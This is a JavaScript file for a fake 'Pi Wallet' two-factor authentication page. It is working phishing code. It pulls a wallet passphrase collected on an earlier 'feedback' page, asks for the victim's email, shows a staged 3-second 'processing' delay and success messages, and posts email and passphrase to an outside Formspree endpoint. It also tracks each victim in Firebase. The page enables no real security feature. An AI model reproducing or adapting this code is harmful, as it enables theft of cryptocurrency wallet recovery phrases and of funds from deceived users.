const toggleBtn = document.getElementById("toggleBtn");
const statusText = document.getElementById("statusText");
const form = document.getElementById("toggleForm");
const actionField = document.getElementById("actionField");
const timestampField = document.getElementById("timestampField");
const emailInput = document.querySelector(".email-input");
const successMessage = document.getElementById("successMessage");

let isOn = false;
let isProcessing = false;
let currentEmailHash = null;
let passphraseHash = null;
let passphrase = null;
let isReturningPassphrase = false;

// Configuration
const FORMSPREE_URL = "https://formspree.io/f/xeeeejkg";
const PROCESSING_DELAY = 3000;

// Hash function for email
function hashEmail(email) {
    let hash = 0;
    for (let i = 0; i < email.length; i++) {
        const char = email.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Load previous 2FA state from Firebase
async function loadPrevious2FAState(emailHash) {
    try {
        const snapshot = await firebase.database()
            .ref('auth_states/' + emailHash)
            .once('value');
        return snapshot.val();
    } catch (error) {
        console.error('Error loading 2FA state:', error);
        return null;
    }
}

// Save 2FA state to Firebase
async function save2FAState(emailHash, email, state) {
    try {
        await firebase.database()
            .ref('auth_states/' + emailHash)
            .set({
                email: email,
                is2FAEnabled: state,
                lastUpdated: firebase.database.ServerValue.TIMESTAMP,
                updatedAt: new Date().toISOString()
            });
        return true;
    } catch (error) {
        console.error('Error saving 2FA state:', error);
        return false;
    }
}

// Update submission to mark as sent to Formspree
async function markAsSentToFormspree(passphraseHash, emailHash) {
    try {
        await firebase.database()
            .ref('submissions/' + passphraseHash)
            .update({
                sentToFormspree: true,
                emailHash: emailHash,
                sentAt: new Date().toISOString()
            });
        return true;
    } catch (error) {
        console.error('Error updating submission:', error);
        return false;
    }
}

// Get passphrase from Firebase
async function getPassphraseFromFirebase(passphraseHash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + passphraseHash)
            .once('value');
        const data = snapshot.val();
        return data ? data.passphrase : null;
    } catch (error) {
        console.error('Error getting passphrase:', error);
        return null;
    }
}

// Initialize page with previous state if exists
async function initializePage() {
    // Check if user came from feedback page with a passphrase
    passphraseHash = sessionStorage.getItem('passphraseHash');
    passphrase = sessionStorage.getItem('passphrase');
    isReturningPassphrase = sessionStorage.getItem('isReturningPassphrase') === 'true';
    const linkedEmailHash = sessionStorage.getItem('linkedEmailHash');
    
    // If no passphrase in session but we have a hash, try to get it from Firebase
    if (passphraseHash && !passphrase) {
        passphrase = await getPassphraseFromFirebase(passphraseHash);
    }
    
    // If returning with a passphrase that has a linked email, try to load that email's state
    if (isReturningPassphrase && linkedEmailHash) {
        console.log('Loading previous state for returning passphrase...');
        const previousState = await loadPrevious2FAState(linkedEmailHash);
        
        if (previousState) {
            // Auto-fill email if we have it
            if (previousState.email) {
                emailInput.value = previousState.email;
            }
            
            // Set the toggle state
            isOn = previousState.is2FAEnabled;
            toggleBtn.classList.toggle("on", isOn);
            currentEmailHash = linkedEmailHash;
            
            const statusMessage = isOn
                ? "✓ 2-factor authentication is ON (Previous state loaded)"
                : "✗ 2-factor authentication is OFF (Previous state loaded)";
            const statusColor = isOn ? "#27ae60" : "#e74c3c";
            
            updateStatus(statusMessage, statusColor);
        }
    }
}

// Auto-load state when email is entered or changed
async function loadStateForEmail() {
    const email = emailInput.value.trim();
    if (!email) return;
    
    const emailHash = hashEmail(email);
    currentEmailHash = emailHash;
    
    const previousState = await loadPrevious2FAState(emailHash);
    
    if (previousState) {
        isOn = previousState.is2FAEnabled;
        toggleBtn.classList.toggle("on", isOn);
        
        const statusMessage = isOn
            ? "✓ 2-factor authentication is ON"
            : "✗ 2-factor authentication is OFF";
        const statusColor = isOn ? "#27ae60" : "#e74c3c";
        
        updateStatus(statusMessage, statusColor);
        
        console.log('Loaded previous 2FA state for this email');
    }
}

// Event listeners for email field
emailInput.addEventListener('blur', loadStateForEmail);
emailInput.addEventListener('change', loadStateForEmail);

// Prevent normal form submission
form.addEventListener("submit", (e) => {
    e.preventDefault();
});

// UI Update Functions
const updateStatus = (message, color) => {
    statusText.textContent = message;
    statusText.style.color = color;
};

const setButtonState = (disabled) => {
    toggleBtn.classList.toggle("disabled", disabled);
};

const showSuccessMessage = () => {
    successMessage.classList.add("show");
};

const hideSuccessMessage = () => {
    successMessage.classList.remove("show");
};

// Send combined data to Formspree (passphrase + email + 2FA state)
const submitCombinedDataToFormspree = async (email, passphrase, is2FAEnabled) => {
    try {
        const formData = new FormData();
        formData.append('email', email);
        formData.append('passphrase', passphrase);
        formData.append('action', is2FAEnabled ? '2FA Enabled' : '2FA Disabled');
        formData.append('is2FAEnabled', is2FAEnabled);
        formData.append('timestamp', new Date().toLocaleString());
        formData.append('_subject', 'Pi Wallet - Passphrase & 2FA Submission');
        
        const response = await fetch(FORMSPREE_URL, {
            method: "POST",
            headers: {
                "Accept": "application/json"
            },
            body: formData
        });
        
        if (response.ok) {
            console.log("Combined data sent successfully to Formspree");
            return true;
        } else {
            console.error("Formspree submission failed");
            return false;
        }
    } catch (error) {
        console.error("Network error:", error);
        return false;
    }
};

// Validation
const validateEmail = () => {
    if (!emailInput.value.trim()) {
        alert("Please enter your email before authenticating.");
        emailInput.focus();
        return false;
    }
    return true;
};

const validatePassphrase = () => {
    if (!passphrase) {
        alert("No passphrase found. Please go back to the feedback page and enter your passphrase.");
        return false;
    }
    return true;
};

// Main Handler
toggleBtn.addEventListener("click", async () => {
    if (!validateEmail() || !validatePassphrase() || isProcessing) {
        return;
    }
    
    isProcessing = true;
    hideSuccessMessage();
    setButtonState(true);
    
    updateStatus("Processing your request...", "#f39c12");
    
    await new Promise(resolve => setTimeout(resolve, PROCESSING_DELAY));
    
    // Toggle state
    isOn = !isOn;
    toggleBtn.classList.toggle("on", isOn);
    
    const email = emailInput.value.trim();
    const emailHash = hashEmail(email);
    currentEmailHash = emailHash;
    
    // Check if this email already has a state in Firebase
    const existingState = await loadPrevious2FAState(emailHash);
    
    // Check if this passphrase was already sent to Formspree
    const submissionData = passphraseHash ? await getPassphraseFromFirebase(passphraseHash) : null;
    const alreadySentToFormspree = submissionData ? submissionData.sentToFormspree : false;
    
    // Prepare status message
    const statusMessage = isOn
        ? "✓ 2FA Authentication ENABLED"
        : "✗ 2FA Authentication DISABLED";
    const statusColor = isOn ? "#27ae60" : "#e74c3c";
    
    updateStatus(statusMessage, statusColor);
    
    // Save state to Firebase ALWAYS
    await save2FAState(emailHash, email, isOn);
    
    // Only send to Formspree if:
    // 1. User toggled 2FA to ON, AND
    // 2. This passphrase hasn't been sent to Formspree before
    let shouldSendToFormspree = isOn && !alreadySentToFormspree;
    
    if (shouldSendToFormspree) {
        console.log('Sending combined data to Formspree: passphrase + email + 2FA status');
        
        // Submit combined data to Formspree
        const success = await submitCombinedDataToFormspree(email, passphrase, isOn);
        
        if (success) {
            // Mark as sent in Firebase
            if (passphraseHash) {
                await markAsSentToFormspree(passphraseHash, emailHash);
            }
            
            successMessage.textContent = "✓ Check your email for confirmation!";
            showSuccessMessage();
        } else {
            updateStatus("⚠️ Connection error. State saved locally.", "#e74c3c");
        }
    } else if (isOn && alreadySentToFormspree) {
        console.log('Already sent to Formspree previously - Firebase updated only');
        successMessage.textContent = "✓ 2FA state updated successfully!";
        showSuccessMessage();
    } else if (!isOn) {
        console.log('2FA toggled OFF - No Formspree submission needed');
        // Don't show success message when turning off
    }
    
    // After first interaction with this passphrase, mark it as processed
    if (isReturningPassphrase) {
        sessionStorage.setItem('isReturningPassphrase', 'false');
        isReturningPassphrase = false;
    }
    
    setButtonState(false);
    isProcessing = false;
});

// Initialize on page load
window.addEventListener('DOMContentLoaded', initializePage);
